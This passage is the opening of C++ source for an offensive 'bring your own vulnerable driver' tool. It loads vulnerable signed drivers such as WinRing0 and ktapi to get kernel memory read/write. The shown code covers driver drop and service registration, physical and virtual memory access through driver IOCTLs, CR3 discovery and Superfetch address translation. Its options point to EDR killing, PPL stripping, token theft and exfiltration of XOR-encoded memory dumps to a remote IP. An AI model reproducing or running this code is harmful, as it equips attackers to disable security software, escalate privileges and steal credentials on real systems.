/*
 * cascade.cpp - Consolidated BYOVD tool
 *
 * Providers supported (--driver-type):
 *   biostool  - BiosToolCommonDriver.sys (IOCTLs: 0x22202C/0x222030/0x222034)
 *   ktapi     - ktapi.sys  (IOCTLs: 0x82007000 map / 0x82007100 unmap)
 *   pdfwkrnl  - PdFwKrnl.sys already loaded (legacy warp.cpp backend)
 *   winring0  - WinRing0.sys  device: WinRing0_1_2_0  (IOCTLs: 0x9C402584/0x9C402588)
 *   ntiolib   - NTIOLib.sys   device: NTIOLib_MysticLight (0x9C40A428/0x9C40A424)
 *   asio3     - AsIO3.sys     device: Asusgio3  (IOCTLs: 0x22200C/0x222008)
 *   lnvmsrio  - LnvMSRIO.sys  device: WinMsrDev (IOCTLs: 0x9C402584/0x9C402588, CVE-2025-8061)
 *   iomap     - IOMap.sys     device: IOMap  (IOCTLs: 0x80102040/0x80102044)
 *   directio  - DirectIo64.sys device: dynamic service name (IOCTLs: 0x8011E044 map / 0x8011E0A0 bit-clear)
 *
 * Requires: administrator, SeLoadDriverPrivilege.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "advapi32.lib")

typedef unsigned long long QWORD;
typedef LONG NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0)
#endif

typedef struct _UNICODE_STRING_W {
    USHORT Length;
    USHORT MaximumLength;
    LPWSTR Buffer;
} UNICODE_STRING_W, *PUNICODE_STRING_W;

typedef NTSTATUS(NTAPI* NtLoadDriver_t)(PUNICODE_STRING_W RegistryPath);
typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING_W RegistryPath);

static NtLoadDriver_t   g_NtLoadDriver   = nullptr;
static NtUnloadDriver_t g_NtUnloadDriver = nullptr;

// ---------------------------------------------------------------------------
// Provider types
// ---------------------------------------------------------------------------
enum class ProviderType { BiosTool, Ktapi, PdfwKrnl, WinRing0, NTIOLib, AsIO3, LnvMSRIO, IOMap, DirectIo };

struct Config {
    ProviderType type         = ProviderType::BiosTool;
    std::string  drvPath;
    std::string  va2paPath;    // optional BiosTool path for Va2Pa when using phys-only backends
    std::string  helperPath;   // optional ktapi.sys helper for directio VA->PA
    bool         directioEnableWrite = false;
    QWORD        directioGatePa      = 0;
    bool         dryRun       = false;
    bool         testRw       = false;
    bool         doPrivEsc    = false;
    bool         doDump       = false;
    bool         doDumpRpm    = false;
    bool         doDumpKernel = false;
    bool         doDumpTcp    = false;
    bool         doPatchCallbacks  = false;
    bool         doListCallbacks   = false;
    bool         doListProcs       = false;
    bool         doPplStrip   = false;
    bool         doPplAdd     = false;
    bool         killEdr      = false;
    bool         doKillPid    = false;
    bool         doDecode     = false;
    bool         noXor        = false;
    bool         verbose      = false;
    std::string  outPath;
    std::string  inPath;
    std::string  recvIp;
    int          recvPort     = 9999;
    DWORD        targetPid    = 0;
    BYTE         xorKey       = 0x55;
};

static bool g_verbose = false;

// ---------------------------------------------------------------------------
// EPROCESS offsets
// ---------------------------------------------------------------------------
struct KernelOffsets {
    ULONG64 UniqueProcessId    = 0;
    ULONG64 ActiveProcessLinks = 0;
    ULONG64 ImageFileName      = 0;
    ULONG64 Protection         = 0;
    ULONG64 Token              = 0;
};
static KernelOffsets g_off;

static void SetOffsetsByBuild(DWORD build) {
    g_off.UniqueProcessId    = 0x440;
    g_off.ActiveProcessLinks = 0x448;
    if (build >= 26100) {
        g_off.Token         = 0x248;
        g_off.Protection    = 0x5FA;
        g_off.ImageFileName = 0x338;
    } else if (build >= 22000) {
        g_off.Token         = 0x4B8;
        g_off.Protection    = 0x87A;
        g_off.ImageFileName = 0x5A8;
    } else if (build >= 19041) {
        g_off.Token         = 0x4B8;
        g_off.Protection    = 0x87A;
        g_off.ImageFileName = 0x5A8;
    } else if (build >= 18362) {
        g_off.Token         = 0x360;
        g_off.Protection    = 0x6FA;
        g_off.ImageFileName = 0x450;
    } else {
        g_off.Token         = 0x358;
        g_off.Protection    = 0x6CA;
        g_off.ImageFileName = 0x448;
    }
    if (g_verbose)
        printf("[*] Build %lu: UniqueProcessId=0x%llX APL=0x%llX FileName=0x%llX Protection=0x%llX Token=0x%llX\n",
            build, g_off.UniqueProcessId, g_off.ActiveProcessLinks,
            g_off.ImageFileName, g_off.Protection, g_off.Token);
}

static DWORD GetWindowsBuild() {
    HKEY hk;
    DWORD build = 0, sz = sizeof(build);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "CurrentBuildNumber", nullptr, nullptr,
            (LPBYTE)&build, &sz);
        if (!build) {
            char buf[16]{};
            sz = sizeof(buf);
            if (RegQueryValueExA(hk, "CurrentBuildNumber", nullptr, nullptr,
                (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                build = (DWORD)atol(buf);
        }
        RegCloseKey(hk);
    }
    return build;
}

// ---------------------------------------------------------------------------
// Privilege helper
// ---------------------------------------------------------------------------
static bool EnablePrivilege(const char* privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueA(nullptr, privName, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)
            && GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(hToken);
    return ok;
}

// ---------------------------------------------------------------------------
// Driver management
// ---------------------------------------------------------------------------
static std::wstring g_svcName;
static std::wstring g_regPath;
static std::wstring g_dropPath;

static std::wstring Utf8ToWide(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
    return w;
}

static std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, s.data(), n, nullptr, nullptr);
    return s;
}

static std::wstring SvcNameFromPath(const std::wstring& path) {
    auto pos = path.rfind(L'\\');
    std::wstring base = (pos == std::wstring::npos) ? path : path.substr(pos + 1);
    auto dot = base.rfind(L'.');
    if (dot != std::wstring::npos) base = base.substr(0, dot);
    return base;
}

static std::wstring RandomDropName() {
    static const wchar_t kChars[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    BYTE rnd[8]{};
    HCRYPTPROV prov = 0;
    if (CryptAcquireContextW(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        CryptGenRandom(prov, sizeof(rnd), rnd);
    else
        for (int i = 0; i < 8; i++) rnd[i] = (BYTE)(GetTickCount() ^ GetCurrentProcessId() ^ i);
    if (prov) CryptReleaseContext(prov, 0);
    std::wstring name;
    for (int i = 0; i < 8; i++)
        name += kChars[rnd[i] % 36];
    return name;
}

static bool CopyDriverToTemp(const std::wstring& srcPath, std::wstring& outDest) {
    wchar_t temp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, temp);
    std::wstring name = RandomDropName() + L".sys";
    outDest = std::wstring(temp) + name;
    wchar_t srcFull[MAX_PATH]{}, dstFull[MAX_PATH]{};
    GetFullPathNameW(srcPath.c_str(), MAX_PATH, srcFull, nullptr);
    GetFullPathNameW(outDest.c_str(), MAX_PATH, dstFull, nullptr);
    if (_wcsicmp(srcFull, dstFull) == 0) return true;
    if (!CopyFileW(srcPath.c_str(), outDest.c_str(), FALSE)) {
        printf("[-] CopyFile failed (%lu)\n", GetLastError());
        return false;
    }
    return true;
}

static bool CreateDriverService(const std::wstring& svcName, const std::wstring& sysPath) {
    std::wstring ntPath  = L"\\??\\" + sysPath;
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    HKEY hk;
    LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, nullptr,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nullptr, &hk, nullptr);
    if (rc != ERROR_SUCCESS) { printf("[-] RegCreateKey failed (%ld)\n", rc); return false; }
    DWORD type = 1, start = 3, err = 1;
    RegSetValueExW(hk, L"Type",         0, REG_DWORD, (BYTE*)&type,  sizeof(type));
    RegSetValueExW(hk, L"Start",        0, REG_DWORD, (BYTE*)&start, sizeof(start));
    RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err,   sizeof(err));
    RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ,
        (BYTE*)ntPath.c_str(), (DWORD)((ntPath.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hk);
    return true;
}

static bool LoadDriverViaNt(const std::wstring& regPath) {
    UNICODE_STRING_W us{};
    us.Buffer        = (LPWSTR)regPath.c_str();
    us.Length        = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS st = g_NtLoadDriver(&us);
    if (!NT_SUCCESS(st)
        && st != (LONG)0xC000010E   /* STATUS_IMAGE_ALREADY_LOADED */
        && st != (LONG)0xC0000035   /* STATUS_OBJECT_NAME_COLLISION: device already registered */
    ) {
        printf("[-] NtLoadDriver failed: 0x%08lX\n", st);
        return false;
    }
    printf("[+] NtLoadDriver: 0x%08lX\n", st);
    return true;
}

static bool UnloadDriverViaNt(const std::wstring& regPath) {
    if (!g_NtUnloadDriver) return false;
    UNICODE_STRING_W us{};
    us.Buffer        = (LPWSTR)regPath.c_str();
    us.Length        = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS st = g_NtUnloadDriver(&us);
    printf("[*] NtUnloadDriver: 0x%08lX\n", st);
    return NT_SUCCESS(st);
}

static void DeleteServiceKey(const std::wstring& svcName) {
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
}

// ---------------------------------------------------------------------------
// Kernel R/W - BiosToolCommonDriver backend
// ---------------------------------------------------------------------------
static HANDLE g_biostoolDev = INVALID_HANDLE_VALUE;

#define BIOSTOOL_READ_PHYS  0x22202Cu
#define BIOSTOOL_WRITE_PHYS 0x222030u
#define BIOSTOOL_VA2PA      0x222034u

static PVOID BiosTool_Va2Pa(PVOID va) {
    struct { PVOID VA; PVOID PA; } req{va, nullptr};
    DWORD ret = 0;
    if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_VA2PA,
        &req, sizeof(req), &req, sizeof(req), &ret, nullptr)) {
        static bool dbg_va2pa = false;
        if (!dbg_va2pa) {
            printf("[dbg] BiosTool_Va2Pa IOCTL 0x%08X failed: err=%lu va=%p dev=0x%p\n",
                BIOSTOOL_VA2PA, GetLastError(), va, (void*)g_biostoolDev);
            dbg_va2pa = true;
        }
        return nullptr;
    }
    return req.PA;
}

static bool BiosTool_ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
    auto pCurPA  = (PUCHAR)pa;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pCurPA & 0xFFF;
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)(0x1000 - pageOff));
        struct { PVOID PA; ULONG Size; ULONG Pad; } req{pCurPA, chunk, 0};
        BYTE tmp[0x1008]{};
        DWORD got = 0;
        if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_READ_PHYS,
            &req, sizeof(req), tmp, sizeof(tmp), &got, nullptr))
            return false;
        memcpy(pCurBuf, tmp + 8, chunk);
        pCurPA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool BiosTool_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    auto pCurPA   = (PUCHAR)pa;
    auto pCurData = (PUCHAR)data;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pCurPA & 0xFFF;
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)(0x1000 - pageOff));
        struct { ULONG Size; ULONG Pad; PUCHAR Data; PVOID PA; }
            req{ chunk, 0, pCurData, pCurPA };
        DWORD got = 0;
        if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_WRITE_PHYS,
            &req, sizeof(req), &req, sizeof(req), &got, nullptr))
            return false;
        pCurPA   += chunk;
        pCurData += chunk;
        size     -= chunk;
    }
    return true;
}

static bool BiosTool_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = BiosTool_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!BiosTool_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool BiosTool_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = BiosTool_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!BiosTool_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - Ktapi backend
// Device: \\.\ktapi   IOCTLs: 0x82007000 (map PA->VA)  0x82007100 (unmap)
// VA->PA: CR3 page walk bootstrapped from physical scan of PML4 self-ref.
// ---------------------------------------------------------------------------
static HANDLE g_ktapiDev = INVALID_HANDLE_VALUE;
static QWORD  g_ktapiCr3 = 0;  // kernel CR3 found by PML4 scan

#define KTAPI_IOCTL_MAP   0x82007000u
#define KTAPI_IOCTL_UNMAP 0x82007100u

static PVOID Ktapi_MapPhys(PVOID pa, SIZE_T size) {
    struct { ULONG InterfaceType; ULONG BusNumber; PVOID PhysAddr; ULONG AddrSpace; ULONG Length; }
        req{ 0, 0, pa, 0, (ULONG)size };
    PVOID mapped = nullptr;
    DWORD got = 0;
    DeviceIoControl(g_ktapiDev, KTAPI_IOCTL_MAP, &req, sizeof(req),
                    &mapped, sizeof(mapped), &got, nullptr);
    return mapped;
}

static void Ktapi_UnmapPhys(PVOID mapped) {
    if (!mapped) return;
    DWORD got = 0;
    DeviceIoControl(g_ktapiDev, KTAPI_IOCTL_UNMAP, &mapped, sizeof(mapped),
                    nullptr, 0, &got, nullptr);
}

static QWORD Ktapi_PhysReadQword(QWORD pa);
static bool Ktapi_PhysRead(PVOID pa, SIZE_T size, PVOID buf);
static QWORD Ktapi_WalkVaWithCr3(QWORD cr3, QWORD va);
static QWORD Ktapi_FindCr3(QWORD checkVa = 0);

static QWORD Ktapi_PhysReadQword(QWORD pa) {
    QWORD v = 0;
    PVOID m = Ktapi_MapPhys((PVOID)pa, 8);
    if (m) { v = *(QWORD*)m; Ktapi_UnmapPhys(m); }
    return v;
}

static bool Ktapi_PhysRead(PVOID pa, SIZE_T size, PVOID buf) {
    auto pCurPA  = (PUCHAR)pa;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR off   = (ULONG_PTR)pCurPA & 0xFFF;
        SIZE_T    chunk = std::min(size, (SIZE_T)(0x1000 - off));
        PVOID m = Ktapi_MapPhys((PVOID)((ULONG_PTR)pCurPA & ~(ULONG_PTR)0xFFF), 0x1000);
        if (!m) return false;
        memcpy(pCurBuf, (PUCHAR)m + off, chunk);
        Ktapi_UnmapPhys(m);
        pCurPA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool Ktapi_PhysWrite(PVOID pa, SIZE_T size, PVOID data) {
    auto pCurPA   = (PUCHAR)pa;
    auto pCurData = (PUCHAR)data;
    while (size > 0) {
        ULONG_PTR off   = (ULONG_PTR)pCurPA & 0xFFF;
        SIZE_T    chunk = std::min(size, (SIZE_T)(0x1000 - off));
        PVOID m = Ktapi_MapPhys((PVOID)((ULONG_PTR)pCurPA & ~(ULONG_PTR)0xFFF), 0x1000);
        if (!m) return false;
        memcpy((PUCHAR)m + off, pCurData, chunk);
        Ktapi_UnmapPhys(m);
        pCurPA   += chunk;
        pCurData += chunk;
        size     -= chunk;
    }
    return true;
}

static QWORD g_ktapiScanLimit = 0;

static bool Ktapi_TablePaSafe(QWORD pa) {
    if (!pa || (g_ktapiScanLimit && pa >= g_ktapiScanLimit)) return false;
    if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) return false;
    return true;
}

static QWORD Ktapi_WalkVaWithCr3(QWORD cr3, QWORD va) {
    QWORD pml4pa = cr3 & ~0xFFFULL;
    if (!Ktapi_TablePaSafe(pml4pa)) return 0;
    QWORD pml4e = Ktapi_PhysReadQword(pml4pa + ((va >> 39) & 0x1FF) * 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdptpa = pml4e & ~0xFFFULL;
    if (!Ktapi_TablePaSafe(pdptpa)) return 0;
    QWORD pdpte = Ktapi_PhysReadQword(pdptpa + ((va >> 30) & 0x1FF) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) {
        QWORD pa = (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
        return Ktapi_TablePaSafe(pa) ? pa : 0;
    }
    QWORD pdpa = pdpte & ~0xFFFULL;
    if (!Ktapi_TablePaSafe(pdpa)) return 0;
    QWORD pde = Ktapi_PhysReadQword(pdpa + ((va >> 21) & 0x1FF) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) {
        QWORD pa = (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
        return Ktapi_TablePaSafe(pa) ? pa : 0;
    }
    QWORD ptPa = pde & ~0xFFFULL;
    if (!Ktapi_TablePaSafe(ptPa)) return 0;
    QWORD pte = Ktapi_PhysReadQword(ptPa + ((va >> 12) & 0x1FF) * 8);
    if (!(pte & 1)) return 0;
    QWORD pa = (pte & ~0xFFFULL) | (va & 0xFFF);
    return Ktapi_TablePaSafe(pa) ? pa : 0;
}

// Scan physical RAM for a self-referencing PML4 page.
// Primary index is 0x1FF (canonical kernel half); fallback covers the
// remaining canonical kernel PML4 indexes 0x100..0x1FE.
// If checkVa is given, candidates are validated by walking checkVa and
// expecting an MZ header at the resulting physical address.
static QWORD Ktapi_FindCr3(QWORD checkVa) {
    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    QWORD limit = ms.ullTotalPhys ? ms.ullTotalPhys : 0x100000000ULL;
    if (limit > 0x200000000ULL) limit = 0x200000000ULL;
    if (limit & 0xFFFULL) limit += 0x1000;
    g_ktapiScanLimit = limit;

    auto scanIndexes = [&](int idxLo, int idxHi, QWORD& fallbackOut) -> QWORD {
        QWORD fallback = 0;
        for (QWORD pa = 0; pa < limit; pa += 0x1000) {
            if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;
            if (pa % 0x10000000ULL == 0) {
                printf("[*] CR3 scan pa=0x%llX limit=0x%llX idx=%d..%d\n",
                       pa, limit, idxLo, idxHi);
                FILE* pf = fopen("C:\\bad\\cr3_scan.log", "a");
                if (pf) { fprintf(pf, "pa=%llX limit=%llX idx=%d..%d\n", pa, limit, idxLo, idxHi); fclose(pf); }
            }
            PVOID m = Ktapi_MapPhys((PVOID)pa, 0x1000);
            if (!m) continue;
            PUCHAR pml4 = (PUCHAR)m;
            bool self = false;
            for (int idx = idxLo; idx <= idxHi; idx++) {
                QWORD entry = *(QWORD*)(pml4 + idx * 8);
                if ((entry & 1) && (entry & ~0xFFFULL) == pa) {
                    self = true;
                    break;
                }
            }
            Ktapi_UnmapPhys(m);
            if (!self) continue;
            if (!fallback) fallback = pa;
            if (checkVa) {
                QWORD targetPa = Ktapi_WalkVaWithCr3(pa, checkVa);
                if (targetPa) {
                    BYTE mz[2]{};
                    if (Ktapi_PhysRead((PVOID)targetPa, 2, mz) && mz[0] == 'M' && mz[1] == 'Z') {
                        printf("[+] CR3 candidate validated: 0x%llX (va 0x%llX -> pa 0x%llX)\n",
                               pa, checkVa, targetPa);
                        return pa;
                    }
                }
            }
        }
        fallbackOut = fallback;
        return 0;
    };

    QWORD fallbackPrimary = 0;
    QWORD validated = scanIndexes(0x1FF, 0x1FF, fallbackPrimary);
    if (validated) return validated;

    QWORD fallbackSecondary = 0;
    validated = scanIndexes(0x100, 0x1FE, fallbackSecondary);
    if (validated) return validated;

    QWORD fallback = fallbackPrimary ? fallbackPrimary : fallbackSecondary;
    if (fallback) {
        printf("[!] CR3 self-ref fallback (unvalidated): 0x%llX\n", fallback);
        return fallback;
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Superfetch VA->PA
// ---------------------------------------------------------------------------
extern "C" NTSTATUS NTAPI NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength);

struct PF_PHYSICAL_MEMORY_RANGE_S {
    SIZE_T BasePfn;
    SIZE_T PageCount;
};

struct PF_MEMORY_RANGE_INFO_V1_S {
    ULONG Version;
    ULONG RangeCount;
    PF_PHYSICAL_MEMORY_RANGE_S Ranges[1];
};

struct PF_MEMORY_RANGE_INFO_V2_S {
    ULONG Version;
    ULONG Flags;
    ULONG RangeCount;
    PF_PHYSICAL_MEMORY_RANGE_S Ranges[1];
};

struct SYSTEM_MEMORY_LIST_INFORMATION_S {
    SIZE_T ZeroPageCount;
    SIZE_T FreePageCount;
    SIZE_T ModifiedPageCount;
    SIZE_T ModifiedNoWritePageCount;
    SIZE_T BadPageCount;
    SIZE_T PageCountByPriority[8];
    SIZE_T RepurposedPagesByPriority[8];
    ULONG_PTR ModifiedPageCountPageFile;
};

struct MMPFN_IDENTITY_S {
    unsigned long long u1;
    unsigned long long PageFrameIndex;
    PVOID VirtualAddress;
};

struct PF_PFN_PRIO_REQUEST_S {
    ULONG Version;
    ULONG RequestFlags;
    SIZE_T PfnCount;
    SYSTEM_MEMORY_LIST_INFORMATION_S MemInfo;
    MMPFN_IDENTITY_S PageData[1];
};

struct SUPERFETCH_INFORMATION_S {
    ULONG Version;
    ULONG Magic;
    ULONG InfoClass;
    PVOID Data;
    ULONG Length;
};

static std::vector<std::pair<QWORD, QWORD>> g_spfTrans;
static bool g_spfReady = false;
static bool g_spfTried = false;

static NTSTATUS Superfetch_Query(ULONG infoClass, PVOID data, ULONG length, PULONG retLen) {
    SUPERFETCH_INFORMATION_S si{};
    si.Version = 45;
    si.Magic = 0x4368756Bu;
    si.InfoClass = infoClass;
    si.Data = data;
    si.Length = length;
    return NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)79, &si, sizeof(si), retLen);
}

static std::vector<PF_PHYSICAL_MEMORY_RANGE_S> Superfetch_Ranges() {
    std::vector<PF_PHYSICAL_MEMORY_RANGE_S> out;
    ULONG len = 0;

    PF_MEMORY_RANGE_INFO_V1_S v1{};
    v1.Version = 1;
    NTSTATUS st1 = Superfetch_Query(17, &v1, sizeof(v1), &len);
    printf("[dbg] Superfetch v1 probe st=0x%08X len=%lu\n", (unsigned)st1, len);
    if (st1 == (NTSTATUS)0xC0000023 && len > sizeof(v1)) {
        std::vector<BYTE> buf(len, 0);
        auto* p = reinterpret_cast<PF_MEMORY_RANGE_INFO_V1_S*>(buf.data());
        p->Version = 1;
        NTSTATUS st2 = Superfetch_Query(17, p, len, nullptr);
        printf("[dbg] Superfetch v1 full st=0x%08X rangeCount=%lu\n", (unsigned)st2, p->RangeCount);
        if (NT_SUCCESS(st2)) {
            for (ULONG i = 0; i < p->RangeCount; ++i)
                out.push_back(p->Ranges[i]);
            return out;
        }
    }

    PF_MEMORY_RANGE_INFO_V2_S v2{};
    v2.Version = 2;
    NTSTATUS st3 = Superfetch_Query(17, &v2, sizeof(v2), &len);
    printf("[dbg] Superfetch v2 probe st=0x%08X len=%lu\n", (unsigned)st3, len);
    if (st3 == (NTSTATUS)0xC0000023 && len > sizeof(v2)) {
        std::vector<BYTE> buf(len, 0);
        auto* p = reinterpret_cast<PF_MEMORY_RANGE_INFO_V2_S*>(buf.data());
        p->Version = 2;
        NTSTATUS st4 = Superfetch_Query(17, p, len, nullptr);
        printf("[dbg] Superfetch v2 full st=0x%08X rangeCount=%lu\n", (unsigned)st4, p->RangeCount);
        if (NT_SUCCESS(st4)) {
            for (ULONG i = 0; i < p->RangeCount; ++i)
                out.push_back(p->Ranges[i]);
            return out;
        }
    }
    return out;
}

static void Superfetch_Init() {
    if (g_spfTried) return;
    g_spfTried = true;

    if (!EnablePrivilege("SeProfileSingleProcessPrivilege") || !EnablePrivilege("SeDebugPrivilege")) {
        printf("[!] Superfetch: SeProfileSingleProcess/SeDebug not enabled\n");
        return;
    }

    {
        BYTE basic[64]{};
        ULONG rl = 0;
        NTSTATUS sb = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, basic, sizeof(basic), &rl);
        printf("[dbg] NtQuerySystemInformation basic st=0x%08X rl=%lu\n", (unsigned)sb, rl);
    }

    auto ranges = Superfetch_Ranges();
    if (ranges.empty()) {
        printf("[!] Superfetch: no physical memory ranges\n");
        return;
    }

    g_spfTrans.reserve(1u << 20);
    const SIZE_T chunk = 65536;
    for (auto& r : ranges) {
        for (SIZE_T off = 0; off < r.PageCount; off += chunk) {
            SIZE_T cnt = std::min(chunk, r.PageCount - off);
            SIZE_T bufLen = sizeof(PF_PFN_PRIO_REQUEST_S) + sizeof(MMPFN_IDENTITY_S) * (cnt - 1);
            std::vector<BYTE> buf(bufLen, 0);
            auto* req = reinterpret_cast<PF_PFN_PRIO_REQUEST_S*>(buf.data());
            req->Version = 1;
            req->RequestFlags = 1;
            req->PfnCount = cnt;
            for (SIZE_T i = 0; i < cnt; ++i)
                req->PageData[i].PageFrameIndex = r.BasePfn + off + i;

            if (!NT_SUCCESS(Superfetch_Query(6, req, (ULONG)bufLen, nullptr)))
                continue;

            for (SIZE_T i = 0; i < cnt; ++i) {
                if (req->PageData[i].VirtualAddress)
                    g_spfTrans.emplace_back(
                        (QWORD)(ULONG_PTR)req->PageData[i].VirtualAddress,
                        (r.BasePfn + off + i) << 12);
            }
        }
    }

    std::sort(g_spfTrans.begin(), g_spfTrans.end(),
              [](const auto& a, const auto& b) { return a.first < b.first; });
    g_spfReady = !g_spfTrans.empty();
    if (g_spfReady)
        printf("[+] Superfetch VA->PA map: %zu entries\n", g_spfTrans.size());
    else
        printf("[!] Superfetch VA->PA map empty\n");
}

static QWORD Superfetch_Va2Pa(QWORD va) {
    if (!g_spfReady)
        Superfetch_Init();
    if (!g_spfReady)
        return 0;

    QWORD page = va & ~0xFFFULL;
    auto it = std::lower_bound(g_spfTrans.begin(), g_spfTrans.end(), page,
                               [](const auto& p, QWORD v) { return p.first < v; });
    if (it != g_spfTrans.end() && it->first == page)
        return it->second + (va & 0xFFF);
    return 0;
}

static QWORD Ktapi_Va2Pa(QWORD va) {
    QWORD pa = 0;
    if (g_ktapiCr3) {
        QWORD pml4_idx = (va >> 39) & 0x1FF;
        QWORD pdpt_idx = (va >> 30) & 0x1FF;
        QWORD pd_idx   = (va >> 21) & 0x1FF;
        QWORD pt_idx   = (va >> 12) & 0x1FF;
        QWORD offset   = va & 0xFFF;

        QWORD pml4e = Ktapi_PhysReadQword((g_ktapiCr3 & ~0xFFFULL) + pml4_idx * 8);
        if (pml4e & 1) {
            QWORD pdpte = Ktapi_PhysReadQword((pml4e & ~0xFFFULL) + pdpt_idx * 8);
            if (pdpte & 1) {
                if (pdpte & (1ULL << 7))
                    pa = (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
                else {
                    QWORD pde = Ktapi_PhysReadQword((pdpte & ~0xFFFULL) + pd_idx * 8);
                    if (pde & 1) {
                        if (pde & (1ULL << 7))
                            pa = (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
                        else {
                            QWORD pte = Ktapi_PhysReadQword((pde & ~0xFFFULL) + pt_idx * 8);
                            if (pte & 1)
                                pa = (pte & ~0xFFFULL) | offset;
                        }
                    }
                }
            }
        }
    }
    if (!pa)
        pa = Superfetch_Va2Pa(va);
    return pa;
}

static bool Ktapi_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        SIZE_T rem = (SIZE_T)(0x1000 - (pCurVA & 0xFFF));
        SIZE_T chunk = std::min(size, rem);
